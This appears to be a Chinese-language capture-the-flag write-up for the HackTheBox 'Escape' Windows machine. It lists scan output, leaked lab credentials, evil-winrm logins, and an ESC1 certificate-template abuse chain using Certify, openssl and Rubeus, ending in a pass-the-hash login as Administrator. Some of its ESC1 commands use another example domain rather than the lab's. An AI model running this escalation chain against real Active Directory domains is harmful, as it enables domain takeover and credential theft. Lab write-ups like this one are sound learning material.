---
title: HackTheBox-Escape-Windows
date: 2025-3-12 20:00:00
tags: 红队
categories: 红队打靶-Windows
---

# nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 22:50 CST
Nmap scan report for 10.10.11.202
Host is up (2.4s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49709/tcp open  unknown
49719/tcp open  unknown
49743/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

在smb共享的public目录下的sql server.pdf中发现账号密码

```
sql_svc:REGGIE1234ronnie
```

evil-winrm（5985端口打开时才可使用这个连接）

```
evil-winrm  -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```

在sql目录下的log日志中找到账号密码

```
Ryan.Cooper：NuclearMosquito3


evil-winrm  -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```

同样的方法登录后发现user.txt



Certify.exe可以列举系统上的证书，可以发现有漏洞的证书

原理就是，利用有漏洞的证书给管理员创建证书，使用证书去连接



```
  Certify.exe find /vulnerable 扫描有漏洞的证书
```

**漏洞一：**
THESHIRE\Domain 用户可以注册 VulnTemplate 模板，该模板可用于客户端身份验证，并已设置 ENROLLEE_SUPPLIES_SUBJECT （ESC1）

这允许任何人注册此模板并指定任意 Subject Alternative Name （（主题备用名称） （，即作为 DA）。

```
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
```

将该 ` -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` 部分复制到 Linux/macOS 上的文件，然后运行 openssl 命令将其转换为 .pfx。出现提示时，请勿输入密码：

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

然后将pfx文件上传windows

```
Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx /getcredentials
```

得到管理员的NTLM，然后使用这个去登录

```
evil-winrm  -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

